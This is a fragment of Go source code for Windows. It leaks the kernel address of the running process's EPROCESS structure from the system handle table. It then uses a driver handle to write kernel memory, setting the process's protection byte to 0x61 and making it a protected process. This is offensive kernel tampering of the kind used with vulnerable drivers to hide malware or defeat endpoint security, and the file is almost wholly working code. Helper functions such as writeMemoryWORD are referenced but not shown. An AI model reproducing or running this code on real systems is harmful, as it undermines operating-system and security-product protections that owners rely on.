package main

import (
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

func getEPROCESSAddress(pID uint32) uintptr {
	pHandle, err := windows.OpenProcess(windows.SYNCHRONIZE, false, pID)
	if err != nil {
		panic(err)
	}
	defSize := uint32(0x800000)
	tmpSysHandleInfo := make([]byte, defSize)
	sysHandleTableEntryInfoSize := int(unsafe.Sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO{}))
	var sysHandleInfo SYSTEM_HANDLE_INFORMATION
	var retSize uint32
	status := windows.NtQuerySystemInformation(0x10, unsafe.Pointer(&tmpSysHandleInfo[0]), defSize, &retSize)
	if status != nil {
		if uint32(status.(windows.NTStatus)) == 0xc0000004 {
			overSize := retSize * 2
			tmpSysHandleInfo = make([]byte, overSize)
			status = windows.NtQuerySystemInformation(0x10, unsafe.Pointer(&tmpSysHandleInfo[0]), overSize, &overSize)
			if status != nil {
				fmt.Println(status)
				return 0
			}
		} else {
			fmt.Println(status)
			return 0
		}
	}
	byteSysHandleInfo := tmpSysHandleInfo[:retSize]
	sysHandleInfoCount := *(*uint32)(unsafe.Pointer(&byteSysHandleInfo[0]))
	sysHandleInfo.NumberOfHandles = sysHandleInfoCount
	sysHandleInfo.Handles = make([]SYSTEM_HANDLE_TABLE_ENTRY_INFO, sysHandleInfoCount)

	for i := 0; i < int(sysHandleInfoCount); i++ {
		sysHandleInfo.Handles[i] = *(*SYSTEM_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&byteSysHandleInfo[8+(sysHandleTableEntryInfoSize*i)]))
	}
	//sysHandleInfo.Handles = (*(*[0x1000000]SYSTEM_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&byteSysHandleInfo[8])))[:]

	for i := 0; i < int(sysHandleInfo.NumberOfHandles); i++ {
		handle := sysHandleInfo.Handles[i]
		if handle.UniqueProcessId != uint16(pID) {
			continue
		}
		fmt.Printf("[*] Handle for the current process (PID: %d): 0x%x at 0x%x debug handle:%x\n", pID, handle.HandleValue, handle.Object, pHandle)
		if handle.HandleValue == uint16(uintptr(pHandle)) {
			fmt.Printf("[+] Found the handle of the current process (PID: %d): 0x%x at 0x%x\n", pID, handle.HandleValue, handle.Object)
			return handle.Object
		}
	}
	windows.CloseHandle(pHandle)
	return 0
}

func setProcessAsProtected() {
	device := getDriverHandle()

	ntoskrnlOffsets := getNtoskrnlVersion()
	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
	if ntoskrnlVersion == "" {
		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
		return
	}
	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
	currentPID := uint32(os.Getpid())
	processEPROCESSAddress := getEPROCESSAddress(currentPID)
	processSignatureLevelAddress := DWORD64(processEPROCESSAddress + uintptr(ntoskrnlOffsets.psProtection))
	writeMemoryWORD(device, processSignatureLevelAddress, 0x61)
	windows.CloseHandle(device)
}
